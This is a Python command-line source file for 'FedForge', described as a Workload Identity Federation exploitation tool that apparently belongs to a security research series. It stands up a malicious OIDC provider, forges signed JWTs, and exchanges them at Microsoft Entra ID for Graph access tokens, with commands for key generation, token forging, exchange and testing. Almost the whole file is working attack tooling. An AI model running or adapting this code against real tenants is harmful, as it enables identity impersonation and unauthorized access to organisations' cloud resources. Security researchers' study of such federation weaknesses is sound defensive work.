#!/usr/bin/env python3
"""
FedForge - Workload Identity Federation Exploitation Tool
Main CLI application
"""

import click
import json
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

from server import create_server, KeyManager
from client import TokenForge, TokenExchange

console = Console()


@click.group()
@click.version_option(version="0.1.0")
def cli():
    """
    FedForge - Workload Identity Federation Exploitation Tool
    
    A toolkit for exploiting Workload Identity Federation in Microsoft Entra ID
    by standing up a malicious OIDC provider and forging tokens.
    """
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║                        FedForge                           ║
    ║         Workload Identity Federation Exploitation         ║
    ║                                                           ║
    ║  "Feds Watching" Research Series - Part 1                ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    console.print(banner, style="bold cyan")


@cli.group()
def server():
    """Manage the OIDC provider server"""
    pass


@server.command()
@click.option('--host', default='0.0.0.0', help='Host to bind to')
@click.option('--port', default=8080, type=int, help='Port to listen on')
@click.option('--issuer', help='Public issuer URL (e.g., https://your-domain.ts.net)')
@click.option('--key-dir', default='./keys', help='Directory for RSA keys')
@click.option('--debug', is_flag=True, help='Enable debug mode')
def start(host, port, issuer, key_dir, debug):
    """Start the OIDC provider server"""
    try:
        if issuer:
            console.print(f"[cyan]Using custom issuer: {issuer}[/cyan]")
        else:
            console.print(f"[yellow]No issuer specified, using default: http://{host}:{port}[/yellow]")
            console.print("[yellow]Note: For Tailscale/ngrok, use --issuer with your public URL[/yellow]\n")
        
        oidc_server = create_server(host=host, port=port, key_dir=key_dir, issuer=issuer)
        oidc_server.run(debug=debug)
    except KeyboardInterrupt:
        console.print("\n[yellow]Server stopped by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Error starting server: {e}[/red]")


@cli.group()
def token():
    """Token operations (create, exchange, decode)"""
    pass


@token.command()
@click.option('--issuer', required=True, help='Issuer URL (your OIDC provider)')
@click.option('--subject', required=True, help='Subject identifier')
@click.option('--audience', default='api://AzureADTokenExchange', help='Token audience')
@click.option('--claims', help='Additional claims as JSON string')
@click.option('--lifetime', default=3600, type=int, help='Token lifetime in seconds')
@click.option('--key-dir', default='./keys', help='Directory containing RSA keys')
@click.option('--output', '-o', help='Save token to file')
def create(issuer, subject, audience, claims, lifetime, key_dir, output):
    """Create a forged JWT token"""
    try:
        # Load keys
        key_manager = KeyManager(key_dir=key_dir)
        private_key = key_manager.get_private_key()
        
        # Parse additional claims if provided
        additional_claims = None
        if claims:
            try:
                additional_claims = json.loads(claims)
            except json.JSONDecodeError:
                console.print("[red]Error: Invalid JSON in --claims[/red]")
                return
        
        # Create token forge
        forge = TokenForge(private_key, kid=key_manager.kid)
        
        # Forge the token
        console.print("\n[cyan]Forging token...[/cyan]")
        jwt_token = forge.create_token(
            issuer=issuer,
            subject=subject,
            audience=audience,
            additional_claims=additional_claims,
            lifetime=lifetime
        )
        
        # Show token info
        forge.print_token_info(jwt_token)
        
        # Display the token
        console.print("[green]✓ Token created successfully![/green]\n")
        console.print(Panel(jwt_token, title="JWT Token", border_style="green"))
        
        # Save to file if requested
        if output:
            Path(output).write_text(jwt_token)
            console.print(f"\n[green]Token saved to {output}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error creating token: {e}[/red]")


@token.command()
@click.option('--token', required=True, help='JWT token (or file path starting with @)')
@click.option('--tenant-id', required=True, help='Azure tenant ID')
@click.option('--client-id', required=True, help='App Registration client ID')
@click.option('--scope', default='https://graph.microsoft.com/.default', help='Token scope')
@click.option('--test', is_flag=True, help='Test the token after exchange')
@click.option('--output', '-o', help='Save access token to file')
def exchange(token, tenant_id, client_id, scope, test, output):
    """Exchange a forged token for an Entra access token"""
    try:
        # Load token from file if it starts with @
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
            console.print(f"[cyan]Loaded token from {token_file}[/cyan]")
        
        # Create exchanger
        exchanger = TokenExchange()
        
        # Exchange the token
        result = exchanger.exchange(
            federated_token=token,
            tenant_id=tenant_id,
            client_id=client_id,
            scope=scope
        )
        
        if result['success']:
            # Save to file if requested
            if output:
                exchanger.save_token(result, output)
            
            # Test the token if requested
            if test:
                exchanger.test_token(result['access_token'])
            
            # Show the access token
            console.print("\n[green]Access Token:[/green]")
            console.print(Panel(result['access_token'], border_style="green"))
        else:
            console.print("[red]Token exchange failed. See error above.[/red]")
    
    except Exception as e:
        console.print(f"[red]Error during exchange: {e}[/red]")


@token.command()
@click.argument('token')
@click.option('--verify', is_flag=True, help='Verify signature (requires public key)')
def decode(token, verify):
    """Decode and display token information"""
    try:
        # Load token from file if it starts with @
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
        
        # Create a temporary forge just for decoding
        from server.keys import KeyManager
        key_manager = KeyManager()
        private_key = key_manager.get_private_key()
        forge = TokenForge(private_key)
        
        forge.print_token_info(token)
        
    except Exception as e:
        console.print(f"[red]Error decoding token: {e}[/red]")


@cli.group()
def keys():
    """Key management operations"""
    pass


@keys.command()
@click.option('--key-dir', default='./keys', help='Directory for RSA keys')
def generate(key_dir):
    """Generate a new RSA key pair"""
    try:
        key_manager = KeyManager(key_dir=key_dir)
        private_key, public_key = key_manager.generate_keys()
        
        console.print("[green]✓ RSA key pair generated successfully![/green]")
        console.print(f"[cyan]Private key: {key_manager.private_key_path}[/cyan]")
        console.print(f"[cyan]Public key: {key_manager.public_key_path}[/cyan]")
        
        # Show JWKS
        jwks = key_manager.get_jwks(public_key)
        console.print("\n[yellow]JWKS (for reference):[/yellow]")
        jwks_json = json.dumps(jwks, indent=2)
        syntax = Syntax(jwks_json, "json", theme="monokai")
        console.print(syntax)
        
    except Exception as e:
        console.print(f"[red]Error generating keys: {e}[/red]")


@keys.command()
@click.option('--key-dir', default='./keys', help='Directory containing RSA keys')
def show(key_dir):
    """Show current key information and JWKS"""
    try:
        key_manager = KeyManager(key_dir=key_dir)
        _, public_key = key_manager.load_keys()
        
        console.print(f"[cyan]Key Directory: {key_manager.key_dir}[/cyan]")
        console.print(f"[cyan]Key ID: {key_manager.kid}[/cyan]")
        
        # Show JWKS
        jwks = key_manager.get_jwks(public_key)
        console.print("\n[yellow]JWKS:[/yellow]")
        jwks_json = json.dumps(jwks, indent=2)
        syntax = Syntax(jwks_json, "json", theme="monokai")
        console.print(syntax)
        
    except Exception as e:
        console.print(f"[red]Error loading keys: {e}[/red]")


if __name__ == '__main__':
    cli()